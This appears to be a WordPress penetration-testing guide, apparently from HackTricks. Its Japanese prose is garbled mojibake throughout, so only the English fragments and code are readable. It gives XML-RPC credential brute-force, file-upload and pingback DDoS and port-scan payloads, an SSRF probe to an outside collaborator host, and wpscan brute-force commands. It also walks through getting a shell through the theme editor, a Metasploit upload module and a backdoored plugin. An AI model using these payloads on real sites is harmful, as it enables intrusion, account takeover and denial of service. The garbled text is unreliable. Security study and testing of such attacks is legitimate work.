# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## åŸºæœ¬æƒ…å ±

- **Uploaded** files go to: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** ãã®ãŸã‚ theme ã® php ã‚’å¤‰æ›´ã—ã¦ RCE ã‚’å¾—ã‚‹å ´åˆã¯ãŠãã‚‰ããã®ãƒ‘ã‚¹ã‚’åˆ©ç”¨ã—ã¾ã™ã€‚ä¾‹ï¼š **theme twentytwelve** ã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹å ´åˆã€**404.php** ãƒ•ã‚¡ã‚¤ãƒ«ã«æ¬¡ã®å ´æ‰€ã‹ã‚‰ **ã‚¢ã‚¯ã‚»ã‚¹** ã§ãã¾ã™: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- `wp-config.php` å†…ã«ã¯ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã® root ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒè¦‹ã¤ã‹ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚
- ç¢ºèªã™ã¹ããƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®ãƒ­ã‚°ã‚¤ãƒ³ãƒ‘ã‚¹: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt` ã«ã¯ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œã¦ã„ã‚‹ WordPress ã®ãƒãƒ¼ã‚¸ãƒ§ãƒ³ãªã©ã®æœ‰ç”¨ãªæƒ…å ±ãŒå«ã¾ã‚Œã¾ã™ã€‚
- `wp-activate.php` ã¯æ–°ã—ã„ WordPress ã‚µã‚¤ãƒˆã‚’ã‚»ãƒƒãƒˆã‚¢ãƒƒãƒ—ã™ã‚‹éš›ã®ãƒ¡ãƒ¼ãƒ«ã‚¢ã‚¯ãƒ†ã‚£ãƒ™ãƒ¼ã‚·ãƒ§ãƒ³ãƒ—ãƒ­ã‚»ã‚¹ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚
- Login ãƒ•ã‚©ãƒ«ãƒ€ï¼ˆéš ã™ãŸã‚ã«åå‰ãŒå¤‰æ›´ã•ã‚Œã¦ã„ã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ï¼‰:
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` ã¯ã€HTTP ã‚’ãƒˆãƒ©ãƒ³ã‚¹ãƒãƒ¼ãƒˆæ©Ÿæ§‹ã€XML ã‚’ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°æ©Ÿæ§‹ã¨ã—ã¦ãƒ‡ãƒ¼ã‚¿ã‚’é€å—ä¿¡ã§ãã‚‹ WordPress ã®æ©Ÿèƒ½ã‚’è¡¨ã™ãƒ•ã‚¡ã‚¤ãƒ«ã§ã™ã€‚ã“ã®ç¨®é¡ã®é€šä¿¡ã¯ WordPress ã® [REST API](https://developer.wordpress.org/rest-api/reference) ã«ã‚ˆã£ã¦ç½®ãæ›ãˆã‚‰ã‚Œã¦ã„ã¾ã™ã€‚
- `wp-content` ãƒ•ã‚©ãƒ«ãƒ€ã¯ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã‚„ãƒ†ãƒ¼ãƒãŒæ ¼ç´ã•ã‚Œã‚‹ä¸»è¦ãªãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã§ã™ã€‚
- `wp-content/uploads/` ã¯ãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã«ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã•ã‚ŒãŸãƒ•ã‚¡ã‚¤ãƒ«ãŒä¿å­˜ã•ã‚Œã‚‹ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã§ã™ã€‚
- `wp-includes/` ã¯è¨¼æ˜æ›¸ã€ãƒ•ã‚©ãƒ³ãƒˆã€JavaScript ãƒ•ã‚¡ã‚¤ãƒ«ã€ã‚¦ã‚£ã‚¸ã‚§ãƒƒãƒˆãªã©ã®ã‚³ã‚¢ãƒ•ã‚¡ã‚¤ãƒ«ãŒæ ¼ç´ã•ã‚Œã‚‹ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã§ã™ã€‚
- `wp-sitemap.xml` WordPress ãƒãƒ¼ã‚¸ãƒ§ãƒ³ 5.5 ä»¥é™ã§ã¯ã€å…¬é–‹ã•ã‚ŒãŸæŠ•ç¨¿ã‚„å…¬é–‹å¯èƒ½ãªæŠ•ç¨¿ã‚¿ã‚¤ãƒ—ã¨ã‚¿ã‚¯ã‚½ãƒãƒŸãƒ¼ã‚’å«ã‚€ sitemap XML ãƒ•ã‚¡ã‚¤ãƒ«ãŒç”Ÿæˆã•ã‚Œã¾ã™ã€‚

**Post exploitation**

- `wp-config.php` ãƒ•ã‚¡ã‚¤ãƒ«ã«ã¯ã€WordPress ãŒãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«æ¥ç¶šã™ã‚‹ãŸã‚ã«å¿…è¦ãªæƒ…å ±ï¼ˆãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹åã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãƒ›ã‚¹ãƒˆã€ãƒ¦ãƒ¼ã‚¶ãƒ¼åã€ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã€èªè¨¼ã‚­ãƒ¼ã¨ã‚½ãƒ«ãƒˆã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ãƒ†ãƒ¼ãƒ–ãƒ«ã®ãƒ—ãƒ¬ãƒ•ã‚£ãƒƒã‚¯ã‚¹ãªã©ï¼‰ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚ã“ã®è¨­å®šãƒ•ã‚¡ã‚¤ãƒ«ã¯ DEBUG ãƒ¢ãƒ¼ãƒ‰ã‚’æœ‰åŠ¹ã«ã™ã‚‹ãŸã‚ã«ã‚‚ä½¿ãˆã€ãƒˆãƒ©ãƒ–ãƒ«ã‚·ãƒ¥ãƒ¼ãƒ†ã‚£ãƒ³ã‚°ã«å½¹ç«‹ã¤ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚

### ãƒ¦ãƒ¼ã‚¶ãƒ¼æ¨©é™

- **Administrator**
- **Editor**: è‡ªåˆ†ãŠã‚ˆã³ä»–è€…ã®æŠ•ç¨¿ã‚’å…¬é–‹ãƒ»ç®¡ç†ã§ãã¾ã™
- **Author**: è‡ªåˆ†ã®æŠ•ç¨¿ã‚’å…¬é–‹ãƒ»ç®¡ç†ã§ãã¾ã™
- **Contributor**: è‡ªåˆ†ã®æŠ•ç¨¿ã‚’åŸ·ç­†ãƒ»ç®¡ç†ã§ãã¾ã™ãŒå…¬é–‹ã¯ã§ãã¾ã›ã‚“
- **Subscriber**: æŠ•ç¨¿ã‚’é–²è¦§ã—è‡ªèº«ã®ãƒ—ãƒ­ãƒ•ã‚£ãƒ¼ãƒ«ã‚’ç·¨é›†ã§ãã¾ã™

## **Passive Enumeration**

### **Get WordPress version**

ãƒ•ã‚¡ã‚¤ãƒ« `/license.txt` ã¾ãŸã¯ `/readme.html` ãŒè¦‹ã¤ã‹ã‚‹ã‹ç¢ºèªã—ã¦ãã ã•ã„

ãƒšãƒ¼ã‚¸ã® **ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰** å†…ï¼ˆä¾‹: [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)ï¼‰:

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS ãƒªãƒ³ã‚¯ãƒ•ã‚¡ã‚¤ãƒ«

![](<../../images/image (533).png>)

- JavaScript ãƒ•ã‚¡ã‚¤ãƒ«

![](<../../images/image (524).png>)

### ãƒ—ãƒ©ã‚°ã‚¤ãƒ³ã‚’å–å¾—
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### ãƒ†ãƒ¼ãƒã‚’å–å¾—
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### ä¸€èˆ¬çš„ãªãƒãƒ¼ã‚¸ãƒ§ãƒ³æŠ½å‡º
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## ã‚¢ã‚¯ãƒ†ã‚£ãƒ–ãªåˆ—æŒ™

### Plugins and Themes

ãŠãã‚‰ãã™ã¹ã¦ã®Plugins and Themesã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚å…¨ã¦ã‚’ç™ºè¦‹ã™ã‚‹ã«ã¯ã€Plugins and Themesã®ãƒªã‚¹ãƒˆã‚’**ç©æ¥µçš„ã«Brute Forceã™ã‚‹**å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼ˆå¹¸ã„ã€è‡ªå‹•åŒ–ãƒ„ãƒ¼ãƒ«ãŒã“ã‚Œã‚‰ã®ãƒªã‚¹ãƒˆã‚’å«ã‚“ã§ã„ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ï¼‰ã€‚

### ãƒ¦ãƒ¼ã‚¶ãƒ¼

- **ID Brute:** WordPressã‚µã‚¤ãƒˆã®æœ‰åŠ¹ãªãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼IDã‚’Brute Forcingã™ã‚‹ã“ã¨ã§å–å¾—ã§ãã¾ã™ï¼š
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãŒ **200** ã¾ãŸã¯ **30X** ã®å ´åˆã€ãã® id ã¯ **æœ‰åŠ¹** ã§ã™ã€‚ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãŒ **400** ã®å ´åˆã€ãã® id ã¯ **ç„¡åŠ¹** ã§ã™ã€‚

- **wp-json:** ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æƒ…å ±ã‚’ã‚¯ã‚¨ãƒªã—ã¦å–å¾—ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«é–¢ã™ã‚‹ã„ãã¤ã‹ã®æƒ…å ±ã‚’å…¬é–‹ã™ã‚‹åˆ¥ã® `/wp-json/` ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Note that this endpoint only exposes users that have made a post. **ã“ã®æ©Ÿèƒ½ã‚’æœ‰åŠ¹ã«ã—ã¦ã„ã‚‹ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æƒ…å ±ã®ã¿ãŒæä¾›ã•ã‚Œã¾ã™**ã€‚

Also note that **/wp-json/wp/v2/pages** could leak IP addresses.

- **Login username enumeration**: ãƒ­ã‚°ã‚¤ãƒ³æ™‚ã« **`/wp-login.php`** ã®è¡¨ç¤ºãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼åã®å­˜åœ¨ã«ã‚ˆã£ã¦ç•°ãªã‚‹ãŸã‚ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼åã®åˆ—æŒ™ãŒå¯èƒ½ã§ã™ã€‚

### XML-RPC

If `xml-rpc.php` is active you can perform a credentials brute-force or use it to launch DoS attacks to other resources. (You can automate this process[ using this](https://github.com/relarizky/wpxploit) for example).

To see if it is active try to access to _**/xmlrpc.php**_ and send this request:

**ç¢ºèª**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

**`wp.getUserBlogs`**, **`wp.getCategories`** or **`metaWeblog.getUsersBlogs`** ã¯ã€credentials ã‚’ brute-force ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã‚‹ãƒ¡ã‚½ãƒƒãƒ‰ã®ä¸€éƒ¨ã§ã™ã€‚ã“ã‚Œã‚‰ã®ã„ãšã‚Œã‹ãŒè¦‹ã¤ã‹ã‚Œã°ã€æ¬¡ã®ã‚ˆã†ãªã‚‚ã®ã‚’é€ä¿¡ã§ãã¾ã™ï¼š
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
The message _"Incorrect username or password"_ inside a 200 code response should appear if the credentials aren't valid.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

200 ã‚³ãƒ¼ãƒ‰ã®ãƒ¬ã‚¹ãƒãƒ³ã‚¹å†…ã®ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ _"Incorrect username or password"_ ã¯ã€èªè¨¼æƒ…å ±ãŒç„¡åŠ¹ãªå ´åˆã«è¡¨ç¤ºã•ã‚Œã¾ã™ã€‚

æ­£ã—ã„èªè¨¼æƒ…å ±ã‚’ä½¿ç”¨ã™ã‚‹ã¨ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã§ãã¾ã™ã€‚ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«ã¯ãƒ‘ã‚¹ãŒè¡¨ç¤ºã•ã‚Œã¾ã™ ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))ã€‚
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
ã¾ãŸã€**ã‚ˆã‚Šé«˜é€Ÿãªæ–¹æ³•**ã§è³‡æ ¼æƒ…å ±ã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã§ãã¾ã™ã€‚**`system.multicall`**ã‚’ä½¿ãˆã°ã€åŒã˜ãƒªã‚¯ã‚¨ã‚¹ãƒˆã§è¤‡æ•°ã®è³‡æ ¼æƒ…å ±ã‚’è©¦ã™ã“ã¨ãŒã§ãã¾ã™:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Bypass 2FA**

ã“ã®æ–¹æ³•ã¯ãƒ—ãƒ­ã‚°ãƒ©ãƒ å‘ã‘ã§äººé–“å‘ã‘ã§ã¯ãªãå¤ã„ãŸã‚ã€2FAã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã¾ã›ã‚“ã€‚ã—ãŸãŒã£ã¦ã€æœ‰åŠ¹ãªcredsã‚’æŒã£ã¦ã„ã‚‹ãŒãƒ¡ã‚¤ãƒ³ã®å…¥å£ãŒ2FAã§ä¿è­·ã•ã‚Œã¦ã„ã‚‹å ´åˆã€**xmlrpc.phpã‚’æ‚ªç”¨ã—ã¦ãã‚Œã‚‰ã®credsã§2FAã‚’å›é¿ã—ã¦loginã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“**ã€‚ãŸã ã—ã€ã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã‹ã‚‰è¡Œãˆã‚‹ã™ã¹ã¦ã®æ“ä½œãŒå¯èƒ½ã«ãªã‚‹ã‚ã‘ã§ã¯ã‚ã‚Šã¾ã›ã‚“ãŒã€IppsecãŒ[https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)ã§èª¬æ˜ã—ã¦ã„ã‚‹ã‚ˆã†ã«RCEã«è‡³ã‚‹å¯èƒ½æ€§ã¯æ®‹ã‚Šã¾ã™ã€‚

**DDoS ã¾ãŸã¯ port scanning**

ãƒªã‚¹ãƒˆã®ä¸­ã«ãƒ¡ã‚½ãƒƒãƒ‰_**pingback.ping**_ãŒè¦‹ã¤ã‹ã‚Œã°ã€Wordpressã«ä»»æ„ã®ãƒ›ã‚¹ãƒˆ/ãƒãƒ¼ãƒˆã¸ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ã‚‰ã›ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
ã“ã‚Œã‚’åˆ©ç”¨ã—ã¦ã€**ä½•åƒ**ã®Wordpressã®**ã‚µã‚¤ãƒˆ**ã«ä¸€ã¤ã®**å ´æ‰€**ã¸**ã‚¢ã‚¯ã‚»ã‚¹**ã•ã›ï¼ˆãã®çµæœãã®å ´æ‰€ã§**DDoS**ãŒç™ºç”Ÿã—ã¾ã™ï¼‰ã€ã‚ã‚‹ã„ã¯**Wordpress**ã‚’ä½¿ã£ã¦å†…éƒ¨**ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯**ã‚’**ã‚¹ã‚­ãƒ£ãƒ³**ã•ã›ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ï¼ˆä»»æ„ã®ãƒãƒ¼ãƒˆã‚’æŒ‡å®šã§ãã¾ã™ï¼‰ã€‚
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

ã‚‚ã— **faultCode** ãŒå€¤ **0**ï¼ˆ17ï¼‰ã‚ˆã‚Š **å¤§ãã„** å ´åˆã€ãã®ãƒãƒ¼ãƒˆã¯é–‹ã„ã¦ã„ã¾ã™ã€‚

å‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§ã® **`system.multicall`** ã®ä½¿ç”¨æ–¹æ³•ã‚’å‚ç…§ã—ã¦ã€ã“ã®ãƒ¡ã‚½ãƒƒãƒ‰ã‚’æ‚ªç”¨ã—ã¦ DDoS ã‚’å¼•ãèµ·ã“ã™æ–¹æ³•ã‚’å­¦ã‚“ã§ãã ã•ã„ã€‚

**DDoS**
```html
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

ã“ã®ãƒ•ã‚¡ã‚¤ãƒ«ã¯é€šå¸¸ Wordpress ã‚µã‚¤ãƒˆã®ãƒ«ãƒ¼ãƒˆã«å­˜åœ¨ã—ã¾ã™: **`/wp-cron.php`**\
ã“ã®ãƒ•ã‚¡ã‚¤ãƒ«ã«**ã‚¢ã‚¯ã‚»ã‚¹**ã•ã‚Œã‚‹ã¨ã€è² è·ã®é«˜ã„ MySQL **query** ãŒå®Ÿè¡Œã•ã‚Œã‚‹ãŸã‚ã€**attackers** ãŒ **DoS** ã‚’ **å¼•ãèµ·ã“ã™**ãŸã‚ã«åˆ©ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
ã¾ãŸã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ `wp-cron.php` ã¯å„ãƒšãƒ¼ã‚¸ãƒ­ãƒ¼ãƒ‰ï¼ˆclientãŒ Wordpress ã®ãƒšãƒ¼ã‚¸ã‚’ãƒªã‚¯ã‚¨ã‚¹ãƒˆã™ã‚‹ãŸã³ï¼‰ã§å‘¼ã³å‡ºã•ã‚Œã‚‹ãŸã‚ã€é«˜ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚µã‚¤ãƒˆã§ã¯å•é¡Œï¼ˆDoSï¼‰ã‚’å¼•ãèµ·ã“ã™ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚

Wp-Cron ã‚’ç„¡åŠ¹åŒ–ã—ã€ãƒ›ã‚¹ãƒˆå†…ã§å®šæœŸçš„ã«å¿…è¦ãªå‡¦ç†ã‚’å®Ÿè¡Œã™ã‚‹æœ¬ç‰©ã® cronjob ã‚’ä½œæˆã™ã‚‹ã“ã¨ã‚’æ¨å¥¨ã—ã¾ã™ï¼ˆå•é¡Œã‚’èµ·ã“ã•ãªã„ã‚ˆã†ã«ï¼‰ã€‚

### /wp-json/oembed/1.0/proxy - SSRF

_try to access_ _https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_ ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã¦ã¿ã¦ãã ã•ã„ã€‚Worpress ã‚µã‚¤ãƒˆãŒã‚ãªãŸã«ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

This is the response when it doesn't work:

![](<../../images/image (365).png>)

## SSRF


{{#ref}}
https://github.com/t0gu/quickpress/blob/master/core/requests.go
{{#endref}}

ã“ã®ãƒ„ãƒ¼ãƒ«ã¯ **methodName: pingback.ping** ã¨ ãƒ‘ã‚¹ **/wp-json/oembed/1.0/proxy** ã®å­˜åœ¨ã‚’ç¢ºèªã—ã€å­˜åœ¨ã™ã‚‹å ´åˆã¯ãã‚Œã‚‰ã‚’æ‚ªç”¨ã—ã‚ˆã†ã¨ã—ã¾ã™ã€‚

## è‡ªå‹•ãƒ„ãƒ¼ãƒ«
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## ãƒ“ãƒƒãƒˆã‚’ä¸Šæ›¸ãã—ã¦ã‚¢ã‚¯ã‚»ã‚¹ã‚’å–å¾—ã™ã‚‹

å®Ÿéš›ã®æ”»æ’ƒã¨ã„ã†ã‚ˆã‚Šèˆˆå‘³æœ¬ä½ã®ãƒã‚¿ã§ã™ã€‚CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man) ã§ã¯ä»»æ„ã® wordpress ãƒ•ã‚¡ã‚¤ãƒ«ã®1ãƒ“ãƒƒãƒˆã‚’åè»¢ã§ãã¾ã—ãŸã€‚ã—ãŸãŒã£ã¦ã€ãƒ•ã‚¡ã‚¤ãƒ« `/var/www/html/wp-includes/user.php` ã®ä½ç½® `5389` ã‚’åè»¢ã—ã¦ NOT (`!`) æ¼”ç®—ã‚’ NOP ã«ã§ãã¾ã™ã€‚
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **Panel RCE**

**ãƒ†ãƒ¼ãƒã§ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹ php ã‚’ä¿®æ­£ã™ã‚‹ï¼ˆadmin credentials ãŒå¿…è¦ï¼‰**

Appearance â†’ Theme Editor â†’ 404 Template (å³å´)

php shell ç”¨ã®ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã«å¤‰æ›´ã™ã‚‹:

![](<../../images/image (384).png>)

æ›´æ–°ã—ãŸãƒšãƒ¼ã‚¸ã¸ã©ã†ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã‹ã‚’ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆã§èª¿ã¹ã‚‹ã€‚ä»Šå›ã®å ´åˆã€æ¬¡ã®å ´æ‰€ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

ä½¿ç”¨ä¾‹:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
ã‚»ãƒƒã‚·ãƒ§ãƒ³ã‚’å–å¾—ã™ã‚‹ãŸã‚ã«ã€‚

## Plugin RCE

### PHP plugin

.php ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ plugin ã¨ã—ã¦ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã§ãã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚\
ä¾‹ãˆã°æ¬¡ã®ã‚ˆã†ã« php backdoor ã‚’ä½œæˆã—ã¾ã™:

![](<../../images/image (183).png>)

æ¬¡ã«æ–°ã—ã„ plugin ã‚’è¿½åŠ ã—ã¾ã™:

![](<../../images/image (722).png>)

plugin ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã¦ "Install Now" ã‚’æŠ¼ã—ã¾ã™:

![](<../../images/image (249).png>)

ã€ŒProccedã€ã‚’ã‚¯ãƒªãƒƒã‚¯:

![](<../../images/image (70).png>)

ãŠãã‚‰ãä¸€è¦‹ä½•ã‚‚èµ·ããªã„ã‚ˆã†ã«è¦‹ãˆã¾ã™ãŒã€Media ã«ç§»å‹•ã™ã‚‹ã¨ shell ãŒã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã•ã‚Œã¦ã„ã‚‹ã®ãŒç¢ºèªã§ãã¾ã™:

![](<../../images/image (462).png>)

ãã‚Œã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ã€reverse shell ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã® URL ãŒè¡¨ç¤ºã•ã‚Œã¾ã™:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

ã“ã®æ–¹æ³•ã¯ã€è„†å¼±ã§ã‚ã‚‹ã“ã¨ãŒçŸ¥ã‚‰ã‚Œã¦ã„ã‚‹æ‚ªæ„ã®ã‚ã‚‹ plugin ã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã€web shell ã‚’å–å¾—ã™ã‚‹ãŸã‚ã«æ‚ªç”¨ã™ã‚‹ã“ã¨ã‚’å«ã¿ã¾ã™ã€‚ãƒ—ãƒ­ã‚»ã‚¹ã¯ WordPress dashboard ã‚’é€šã˜ã¦ä»¥ä¸‹ã®ã‚ˆã†ã«å®Ÿè¡Œã•ã‚Œã¾ã™:

1. **Plugin Acquisition**: ã“ã® plugin ã¯ Exploit DB ã®ã‚ˆã†ãªã‚½ãƒ¼ã‚¹ï¼ˆä¾‹: [**here**](https://www.exploit-db.com/exploits/36374)ï¼‰ã‹ã‚‰å…¥æ‰‹ã—ã¾ã™ã€‚
2. **Plugin Installation**:
- WordPress dashboard ã«ç§»å‹•ã—ã€`Dashboard > Plugins > Upload Plugin` ã«é€²ã¿ã¾ã™ã€‚
- ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸ plugin ã® zip ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ã¾ã™ã€‚
3. **Plugin Activation**: plugin ãŒæ­£å¸¸ã«ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚ŒãŸã‚‰ã€dashboard ã‹ã‚‰æœ‰åŠ¹åŒ–ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
4. **Exploitation**:
- plugin "reflex-gallery" ã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã—ã¦æœ‰åŠ¹åŒ–ã™ã‚‹ã¨ã€è„†å¼±ã§ã‚ã‚‹ãŸã‚æ‚ªç”¨å¯èƒ½ã§ã™ã€‚
